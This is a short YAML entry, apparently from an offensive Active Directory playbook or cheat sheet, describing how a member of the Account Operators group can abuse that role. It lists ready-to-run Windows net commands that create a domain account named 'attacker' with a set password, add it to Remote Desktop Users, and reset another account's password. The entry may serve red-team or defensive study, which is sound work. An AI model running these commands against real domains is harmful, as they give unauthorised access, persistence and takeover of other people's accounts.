name: AccountOperators
description: Account Operators can create and modify non-protected accounts
commands:
- '# Create new user'
- net user attacker Password123! /add /domain
- ''
- '# Add to privileged group (not DA directly)'
- net group "Remote Desktop Users" attacker /add /domain
- ''
- '# Modify existing account password'
- net user <TARGET> NewPassword! /domain
